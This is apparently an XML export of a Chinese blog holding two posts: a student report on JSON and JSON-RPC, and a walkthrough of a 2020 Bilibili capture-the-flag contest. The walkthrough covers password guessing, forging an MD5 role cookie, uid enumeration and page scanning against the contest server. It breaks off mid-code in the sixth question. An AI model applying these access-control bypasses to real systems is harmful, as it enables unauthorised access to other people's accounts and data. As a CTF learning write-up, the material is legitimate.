<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JSON/JSON-RPC学习报告</title>
      <link href="/post/ba3b3412.html"/>
      <url>/post/ba3b3412.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="JSON-amp-JSON-RPC学习报告-2019091602014-冯新越"><a href="#JSON-amp-JSON-RPC学习报告-2019091602014-冯新越" class="headerlink" title="JSON&amp;JSON-RPC学习报告-2019091602014-冯新越"></a>JSON&amp;JSON-RPC学习报告-2019091602014-冯新越</h1><h1 id="JSON部分"><a href="#JSON部分" class="headerlink" title="JSON部分"></a>JSON部分</h1><h2 id="什么是JSON"><a href="#什么是JSON" class="headerlink" title="什么是JSON"></a>什么是JSON</h2><p><strong>JSON</strong> : JavaScript Object Notation(JavaScript 对象表示法)</p><ul><li>JSON是一种<strong>存储和交换文本信息的语法</strong>，类似于XML但是更小、更快，更易解析。</li><li>JSON是<strong>独立于语言和平台的</strong>文本数据交换格式。JSON解析器/库支持许多不同的编程语言，多数动态编程语言都支持JSON。</li><li>JSON是<strong>具有自我描述性</strong>的语法，易于理解，也方便机器进行解析和生成。</li></ul><h2 id="JSON与XML的横向对比"><a href="#JSON与XML的横向对比" class="headerlink" title="JSON与XML的横向对比"></a>JSON与XML的横向对比</h2><p>JSON | XML<br>|-:|:-|<br>相同 |都是纯文本、都具有自我描述性、都具有层级结构、都可通过JavaScript解析、都可使用AJAX进行数据传输<br>不同 |JSON没有结束标签、更简短且读写更快、能够使用内建的JavaScript eval()方法进行解析、能使用数组、不使用保留字</p><hr><ul><li>相对于XML语言来说，我们不难看出，JSON具有无可比拟的优越性。<br>  它的简便、轻量、易于维护，繁多的功能支持让他逐渐在Web Service中占据一席之地。</li><li>但是相较于XML，JSON并没有它推广的这么深入人心和广泛使用, 通用性相对略低。</li><li>从我们项目的核心——云边融合控制器管理入手，我们在选取不同的数据交换格式时，不仅要考虑语言的可读性，通用性，实现难度，响应速度等基本因素，还要考虑数据在网络中的传输速度、安全性等问题。因此，我认为JSON是完美契合我们需求的选择。</li></ul><h2 id="JSON基础语法"><a href="#JSON基础语法" class="headerlink" title="JSON基础语法"></a>JSON基础语法</h2><p><strong>JSON语法是JavaScript语法的子集</strong></p><p><em>JSON基础语法规则:</em></p><ul><li>数据在名称/值对中</li><li>数据由逗号分隔</li><li>花括号保存对象</li><li>方括号保存数组</li></ul><p><strong>JSON 名称/值对</strong></p><p>JSON数据的书写格式：名称/值对</p><p>例如：</p><blockquote><p>“firstName”:”John”</p></blockquote><p>他等价于</p><blockquote><p>firstName = “John”</p></blockquote><p><strong>JSON值</strong></p><p><em>JSON值包括:</em></p><ul><li>数字（整数或浮点数）</li><li>字符串（在双引号中）</li><li>逻辑值（true或false）</li><li>数组（在方括号中）</li><li>对象（在花括号中）</li><li>null</li></ul><p><strong>JSON 对象</strong></p><p><em>JSON对象在花括号中书写</em>,例如：</p><blockquote><p>{“firstName”:”John”,”lastName”:”Doe”}</p></blockquote><p>他等价于</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firstName &#x3D; &quot;John&quot;</span><br><span class="line">lastName &#x3D; &quot;Doe&quot;</span><br></pre></td></tr></table></figure></div><p><strong>JSON数组</strong></p><p><em>JSON数组在方括号中书写</em>,数组可以包含多个对象。例如:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;employess&quot;:[</span><br><span class="line">&#123;&quot;firstName&quot;:&quot;John&quot;:&quot;Doe&quot;&#125;,</span><br><span class="line">&#123; &quot;firstName&quot;:&quot;Anna&quot; , &quot;lastName&quot;:&quot;Smith&quot; &#125;,</span><br><span class="line">&#123; &quot;firstName&quot;:&quot;Peter&quot; , &quot;lastName&quot;:&quot;Jones&quot; &#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>JSON使用JavaScript语法</strong></p><p>通过JavaScript,我们可以创建一个对象数组，并直接进行赋值：</p><pre><code>var employees = [{ &quot;firstName&quot;:&quot;Bill&quot; , &quot;lastName&quot;:&quot;Gates&quot; },{ &quot;firstName&quot;:&quot;George&quot; , &quot;lastName&quot;:&quot;Bush&quot; },{ &quot;firstName&quot;:&quot;Thomas&quot; , &quot;lastName&quot;: &quot;Carter&quot; }];</code></pre><p>访问数组</p><blockquote><p>employees[0].lastName;</p></blockquote><p>返回值</p><blockquote><p>Gates</p></blockquote><p>修改数据</p><blockquote><p>employees[0].lastName = “Jobs”;</p></blockquote><p><strong>JSON文件</strong></p><ul><li>JSON文件的文件类型“.json”</li><li>JSON文本的MIME类型是”applicatio/json”</li></ul><h1 id="JSON-RPC部分"><a href="#JSON-RPC部分" class="headerlink" title="JSON-RPC部分"></a>JSON-RPC部分</h1><h2 id="什么是RPC？"><a href="#什么是RPC？" class="headerlink" title="什么是RPC？"></a>什么是RPC？</h2><p><strong>RPC</strong> ： 即Remote Procedure Call Protocol、远程过程调用协议。它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</p><p>RPC协议通过某些传输协议来实现，如传输二进制数据的Socket协议，为通信程序之间携带信息数据。在OSI网络通讯模型中，RPC跨越了传输层和应用层，使得开发包括微服务在内的应用程序更加容易。</p><ul><li>RPC指的是远程过程调用，简而言之，<strong>RPC是从一台机器上通过参数传递的方式调用另一台机器上的一个函数或方法并得到响应结果的方法。</strong></li><li>RPC<strong>隐藏</strong>底层的通讯细节。</li><li>RPC是一个<strong>请求响应模型</strong>，客户端发起请求，服务器返回响应。</li><li>RPC在使用形式上像<strong>调用本地函数</strong>一样去调用远程的函数。</li></ul><h2 id="我们为什么需要使用RPC"><a href="#我们为什么需要使用RPC" class="headerlink" title="我们为什么需要使用RPC"></a>我们为什么需要使用RPC</h2><p>随着现代计算机网络应用的不断进化，大型项目所包含的业务越来越多，应用也越来越多。我们发现有些功能已经不能简单划分开来，甚至无法在一个进程内或一个计算机内通过本地调用的方式完成需求，比如不同系统、不同组织间的通讯。由于对计算能力提出了横向扩展的需求，我们需要在多台机器组成的集群上部署应用。此时，我们将公共业务逻辑抽离出来，将之改组为独立的Service应用。而原有或新增的应用都可以与那些独立的Service应用相交互，以此来构成完整的业务逻辑。因此，RPC的诸多特性使其成为了我们完成以上任务的重要手段。</p><h2 id="RPC的具体原理"><a href="#RPC的具体原理" class="headerlink" title="RPC的具体原理"></a>RPC的具体原理</h2><p>本例中我们使用<strong>Google Protolcol Buffer</strong>实现序列化。</p><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_1.jpg" data-fancybox="group" data-caption="RPC例" class="fancybox"><img alt="RPC例" title="RPC例" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_1.jpg" class="lazyload"></a></p><p>先在RPC中注册callMethod函数，在服务端注册相同的callMethod。调用客户端向服务端发送命令，传送相应的命令和键值，调用callMethod函数实现序列化和反序列化，封包，发送消息。<br>将callMethod函数序列化后的结果发送到服务端，服务端收到消息后，使用callMethod函数进行反序列化，并根据其内容提供Service服务进行响应，对需要反馈的数据通过callMethod函数进行序列化，再将序列化后的结果发送给客户端，最终客户端进行反序列化，处理序列化的结果，完成一个完整的请求——处理——反馈的流程</p><p>同样的，JSON也可以实现如上图的流程</p><hr><p>接下来我们再从内部视角探究RPC的结构</p><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_2.jpg" data-fancybox="group" data-caption="RPC例" class="fancybox"><img alt="RPC例" title="RPC例" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_2.jpg" class="lazyload"></a></p><p>示例：</p><ul><li>RpcServer<br>负责导出（export）远程接口</li><li>RpcClient<br>负责导入（import）远程接口的代理实现</li><li>RpcProxy<br>远程接口的代理实现</li><li>RpcInvoker<br>客户端实现：负责编码调用信息和发送调用请求到服务端并等待调用结果返回<br>服务端实现：负责调用服务端接口的具体实现并返回调用结果</li><li>RpcProtocol<br>负责协议编/解码</li><li>RpcConnector<br>负责维持客户端和服务端的连接通道和发送数据到服务端</li><li>RpcAcceptor<br>负责接收客户端请求并返回请求结果</li><li>RpcProcessor<br>负责在服务端控制调用过程，包括管理调用线程池、超时时间等</li><li>RpcChannel<br>数据传输通道</li></ul><p>RPC服务端通过RpcServer去导出远程接口方法，而客户端通过RpcClient去引入远程接口方法。<br>客户端像调用本地方法一样去调用远程接口方法，RPC框架提供接口的代理实现，实际的调用将委托给代理RpcProxy。 代理封装调用信息并将调用转交给RpcInvoker去实际执行。在客户端的RpcInvoker通过连接器RpcConnector去维持与服务端的通道RpcChannel，并使用RpcProtocol执行协议编码并将编码后的请求消息通过通道发送给服务端。<br>RPC 服务端接收器RpcAcceptor接收客户端的调用请求，同样使用RpcProtocol执行协议解码。解码后的调用信息传递给RpcProcessor去控制处理调用过程，最后再委托调用给RpcInvoker去实际执行并返回调用结果。[1]</p><h2 id="Java中常用的几种RPC框架"><a href="#Java中常用的几种RPC框架" class="headerlink" title="Java中常用的几种RPC框架"></a>Java中常用的几种RPC框架</h2><ul><li><p>RMI（远程方法调用）<br>RMI是JAVA自带的远程方法调用工具，作为JAVA语言最开始时的设计，在现在的应用环境中已经具有了一定的局限性。后来很多框架的原理都基于该框架。</p></li><li><p>Hessian（基于HTTP的远程方法调用）<br>Hessian基于HTTP协议传输，在性能方面还不够完美，负载均衡和失效转移依赖于应用的负载均衡器。Hessian的使用与RMI类似，区别在于淡化了Registry的角色，通过显示的地址调用，利用HessianProxyFactory根据配置的地址create一个代理对象，另外还要引入Hessian的Jar包。</p></li><li><p>Dubbo（淘宝开源的基于TCP的RPC框架）<br>Dubbo是基于Netty的高性能RPC框架，由阿里巴巴开源。它是一个分布式的服务框架与SOA治理方案。其功能主要包括：高性能NIO通讯及多协议集成，服务动态寻址与路由，软负载均衡与容错，依赖分析与降级等。自2011年开源后，已被许多非阿里系公司使用。</p></li></ul><h2 id="引用-资料来源"><a href="#引用-资料来源" class="headerlink" title="引用/资料来源"></a>引用/资料来源</h2><p>[1]From：RPC原理详解</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> JSON-RPC </tag>
            
            <tag> 综合设计 </tag>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bilibili_2020_1024程序员节Ctf</title>
      <link href="/post/6d0a3683.html"/>
      <url>/post/6d0a3683.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>1024，一年一度的程序员节。你好，世界！你好，程序员！<br>（但是 2 0 2 0 - 1 0 2 4 … hhh<br>就在10.24的0点，Bilibili为大家献上了一份大礼：Bilibili_CTF_2020<br>经过了艰苦卓绝（~并不 的奋战，我终于拿到了70 of 100 的分数（平 均 水 平<br>接下来带来这7道题的解析，希望能够成为对Ctf新手的指引吧<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/bilisrc.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/bilisrc.jpg" class="lazyload"></a><br><code>守护世界上最好的睿叔！(笑</code></p><h1 id="Question-ID-1-页面的背后是什么？"><a href="#Question-ID-1-页面的背后是什么？" class="headerlink" title="Question_ID_1 页面的背后是什么？"></a>Question_ID_1 页面的背后是什么？</h1><p>题目地址:<code>http://45.113.201.36/index.html</code></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>顾名思义，页面的背后就是源代码啦~<br>F12检查元素，得到第一题的源码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">    url: &quot;api&#x2F;admin&quot;,</span><br><span class="line">    type: &quot;get&quot;,</span><br><span class="line">    success:function (data) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(data);</span><br><span class="line">        if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">            &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">            var input &#x3D; document.getElementById(&quot;flag1&quot;);</span><br><span class="line">            input.value &#x3D; String(data.data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; 如果没值</span><br><span class="line">            $(&#39;#flag1&#39;).html(&quot;接口异常，请稍后再试～&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><p>根据提示修改url为<code>http://45.113.201.36/api/admin</code>,页面返回<code>{&quot;code&quot;:200,&quot;data&quot;:&quot;9eaf84d8-0336b140-23185a95-13d5825f&quot;,&quot;msg&quot;:&quot;&quot;}</code><br>在依据代码逻辑，我们确定Flag1为<code>9eaf84d8-0336b140-23185a95-13d5825f</code></p><h1 id="Question-ID-2-真正的秘密只有特殊的设备才能看到"><a href="#Question-ID-2-真正的秘密只有特殊的设备才能看到" class="headerlink" title="Question_ID_2 真正的秘密只有特殊的设备才能看到"></a>Question_ID_2 真正的秘密只有特殊的设备才能看到</h1><p>题目地址:<code>http://45.113.201.36/index.html</code></p><h2 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2><p>诶？特殊的设备？<br>还是老老实实检查元素吧~<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/Bilibili_Ctf1.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/Bilibili_Ctf1.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &quot;api&#x2F;ctf&#x2F;2&quot;,</span><br><span class="line">    type: &quot;get&quot;,</span><br><span class="line">    success:function (data) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(data);</span><br><span class="line">        if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">            &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">            $(&#39;#flag2&#39;).html(&quot;flag2: &quot; + data.data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; 如果没值</span><br><span class="line">            $(&#39;#flag2&#39;).html(&quot;需要使用bilibili Security Browser浏览器访问～&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><p>可是，<code>需要使用bilibili Security Browser浏览器访问～</code>又是什么意思呢？<br>对了！我们可以修改UA标识！！<br>F12检查元素，模拟设备，添加自定义设备！<br>我们加入一个名为bilibili Security Browser的新设备，刷新页面发现并没有得出Flag<br>索性把所有涉及设备的参数设置为bilibili Security Browser，F5刷新后，就得到了Flag~<br>Flag2:<code>be74383e-0b87bbde-40c0c5c4-da62eec3</code></p><h1 id="Question-ID-3-密码是啥？"><a href="#Question-ID-3-密码是啥？" class="headerlink" title="Question_ID_3 密码是啥？"></a>Question_ID_3 密码是啥？</h1><p>题目地址:<code>http://45.113.201.36/login.html</code></p><h2 id="解析-2"><a href="#解析-2" class="headerlink" title="解析"></a>解析</h2><p>F12康康代码逻辑</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;falg 3</span><br><span class="line"></span><br><span class="line">$(&quot;#submit&quot;).click(function()&#123;</span><br><span class="line">    </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;api&#x2F;ctf&#x2F;3&quot;,</span><br><span class="line">        type: &quot;post&quot;,</span><br><span class="line">        contentType: &quot;application&#x2F;json&quot;,</span><br><span class="line">        dataType:&quot;json&quot;,</span><br><span class="line">        data: JSON.stringify(&#123;</span><br><span class="line">            username: $(&quot;#name&quot;).val(),</span><br><span class="line">            passwd: $(&quot;#subject&quot;).val(),</span><br><span class="line">        &#125;),</span><br><span class="line">        success:function (data) &#123;</span><br><span class="line">            if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">                alert(&quot;flag is: &quot; + data.data);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                alert(&quot;用户名或密码错误～&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF2.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF2.jpg" class="lazyload"></a><br>密码是什么呢？首先考虑密码爆破！<br>跑完了字典，但是密码并没有试出来……<br>简单想想，用户名应该就是admin没得跑，那么密码是什么呢？<br>最终猜测得到bilibili = = （CTF× 猜 灯 谜√</p><p>Flag3:<code>3f06bf77-e57dad87-a669c72b-4d8b296b</code></p><h1 id="Question-ID-4-对不起，权限不足～"><a href="#Question-ID-4-对不起，权限不足～" class="headerlink" title="Question_ID_4 对不起，权限不足～"></a>Question_ID_4 对不起，权限不足～</h1><p>题目地址:<code>http://45.113.201.36/superadmin.html</code></p><p><a href="undefined" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src class="lazyload"></a></p><h2 id="解析-3"><a href="#解析-3" class="headerlink" title="解析"></a>解析</h2><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF3.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF3.jpg" class="lazyload"></a><br>F12!</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">     url: &quot;api&#x2F;ctf&#x2F;4&quot;,</span><br><span class="line">     type: &quot;get&quot;,</span><br><span class="line">     success:function (data) &#123;</span><br><span class="line">         console.log(data);</span><br><span class="line">         if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">             &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">             $(&#39;#flag&#39;).html(&quot;欢迎超级管理员登陆～答案是 : &#123;&#123; &quot; + data.data + &quot; &#125;&#125;&quot;.toLowerCase() )</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             &#x2F;&#x2F; 如果没值</span><br><span class="line">             $(&#39;#flag&#39;).html(&quot;有些秘密只有超级管理员才能看见哦~&quot;)</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></div><p>好家伙，我直接懵逼.jpg<br>打开Fiddler抓个包~<br>查看返回包的Cookie时候，发现了有意思的东西:<br><code>Cookie: role=ee11cbb19052e40b07aac0ca060c23ee; session=eyJ1aWQiOiIzNzIwODMyMSJ9.X5Qnkw.1NWStBUpUlAWQhYOM9av9W_qEWA</code><br>这个role值就很耐人寻味呀~似乎是一个加密后的字符串？<br>尝试解码，初步确定是MD5加密后的结果，且解密为admin字符串<br>那么思路就应该是替换Cookie的字段值了。将superadmin采用md5加密，利用EditThisCookie插件修改role值，居然不对！<br>猜来猜去，administrator,Superadmin,SuperAdmin……<br>最终正确答案为Administrator【md5:7b7bc2512ee1fedcd76bdc68926d4f7b】 = = 万万没想到啊！<br>修改Cookie后刷新页面，就会返回正确的Flag啦！<br>Flag5:<code>126fb903-b39dfd0d-0bf68925-219cd931</code></p><h1 id="Question-ID-5-别人的秘密"><a href="#Question-ID-5-别人的秘密" class="headerlink" title="Question_ID_5 别人的秘密"></a>Question_ID_5 别人的秘密</h1><p>题目地址:<code>http://45.113.201.36/user.html</code></p><h2 id="解析-4"><a href="#解析-4" class="headerlink" title="解析"></a>解析</h2><p>并看不懂= =，管他的，F12！<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF5.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$(function () &#123;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    (function ($) &#123;</span><br><span class="line">        $.getUrlParam &#x3D; function(name) &#123;</span><br><span class="line">            var reg &#x3D; new RegExp(&quot;(^|&amp;)&quot; + name + &quot;&#x3D;([^&amp;]*)(&amp;|$)&quot;);</span><br><span class="line">            var r &#x3D; window.location.search.substr(1).match(reg);</span><br><span class="line">            if (r !&#x3D; null) return unescape(r[2]); return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(jQuery);</span><br><span class="line"></span><br><span class="line">    var uid &#x3D; $.getUrlParam(&#39;uid&#39;);</span><br><span class="line">    if (uid &#x3D;&#x3D; null) &#123;</span><br><span class="line">        uid &#x3D; 100336889;</span><br><span class="line">    &#125;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;api&#x2F;ctf&#x2F;5?uid&#x3D;&quot; + uid,</span><br><span class="line">        type: &quot;get&quot;,</span><br><span class="line">        success:function (data) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">            if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">                &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">                $(&#39;#flag&#39;).html(&quot;欢迎超级管理员登陆～flag : &quot; + data.data )</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                &#x2F;&#x2F; 如果没值</span><br><span class="line">                $(&#39;#flag&#39;).html(&quot;这里没有你想要的答案～&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>原来如此！遍历！遍历！！<br>用Get方法，以<code>http://45.113.201.36/api/ctf/5?uid=100336889</code>为基准，uid++向上遍历！<br>遍历到<code>http://45.113.201.36/api/ctf/5?uid=100336913</code>的时候，服务端返回了code:200！<br><code>{&quot;code&quot;:200,&quot;data&quot;:&quot;314ebf97-6bc0234f-b906e013-52b47f23&quot;,&quot;msg&quot;:&quot;&quot;}</code><br>(果然是“别人的秘密”呀</p><p>那么，Flag5:<code>314ebf97-6bc0234f-b906e013-52b47f23</code></p><h1 id="Question-ID-6-结束亦是开始"><a href="#Question-ID-6-结束亦是开始" class="headerlink" title="Question_ID_6 结束亦是开始"></a>Question_ID_6 结束亦是开始</h1><p>题目地址:<code>http://45.113.201.36/blog/single.php?id=1</code></p><h2 id="解析-5"><a href="#解析-5" class="headerlink" title="解析"></a>解析</h2><p>终于我们进入了动态页面的世界~<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF6.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF6.jpg" class="lazyload"></a><br>扫描！扫描！<br>我们得到了两个页面:end.php和test.php<br>end.php就和他的名字一样，空白的页面，和一句<strong>你想要的不在这儿～</strong><br>而test.php就有趣的多了:页面返回内容如下</p><h3 id="内容（建议跳过"><a href="#内容（建议跳过" class="headerlink" title="内容（建议跳过"></a>内容（建议跳过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 